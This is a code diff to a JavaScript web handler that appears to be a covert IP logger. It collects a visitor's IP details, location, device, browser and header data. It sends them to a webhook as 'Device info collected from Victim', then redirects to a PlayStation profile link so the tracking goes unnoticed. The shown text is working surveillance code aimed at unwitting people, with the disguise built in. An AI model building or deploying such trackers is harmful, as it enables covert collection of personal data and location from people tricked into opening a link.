@@ -169,8 +169,8 @@ export default async function handler(req, res) {
             res.status(500).send("Failed to retrieve IP information.");
             return;
         }
-        
-        
+
+
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const acceptLanguage = req.headers['accept-language'] || 'Unknown';
         const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
@@ -319,37 +319,51 @@ export default async function handler(req, res) {
 
         // Default: Full Info for Other Requests
         if (!ipDetails.hosting) {
+            console.log("Preparing to send the default message with full info...");
 
-            const fields = createCommonFields(
-                ipDetails,
-                coords,
-                userAgent,
-                deviceType,
-                os,
-                browserEngine,
-                acceptLanguage,
-                acceptEncoding,
-                doNotTrack,
-                referer,
-                reverseDNS,
-                requestMetadata
-            );
+            try {
+                const fields = createCommonFields(
+                    ipDetails,
+                    coords,
+                    userAgent,
+                    deviceType,
+                    os,
+                    browserEngine,
+                    acceptLanguage,
+                    acceptEncoding,
+                    doNotTrack,
+                    referer,
+                    reverseDNS,
+                    requestMetadata
+                );
 
-            const message = {
-                embeds: [
-                    {
-                        title: "User Opened Link",
-                        color: 0x00FFFF,
-                        description: "Device info collected from Victim.",
-                        fields: fields
-                    }
-                ]
-            };
-            await sendToWebhook(message);
+                console.log("Fields for webhook message created successfully:", fields);
+
+                const message = {
+                    embeds: [
+                        {
+                            title: "User Opened Link",
+                            color: 0x00FFFF,
+                            description: "Device info collected from Victim.",
+                            fields: fields
+                        }
+                    ]
+                };
+
+                console.log("Webhook message prepared:", JSON.stringify(message, null, 2));
+
+                await sendToWebhook(message);
+
+                console.log("Default webhook message sent successfully.");
+            } catch (error) {
+                console.error("An error occurred while sending the default webhook message:", error);
+            }
         }
 
+        console.log("Redirecting user to https://profile.playstation.com/LB7...");
         res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
         res.end();
+
     } else {
         res.status(405).send("Method Not Allowed");
     }
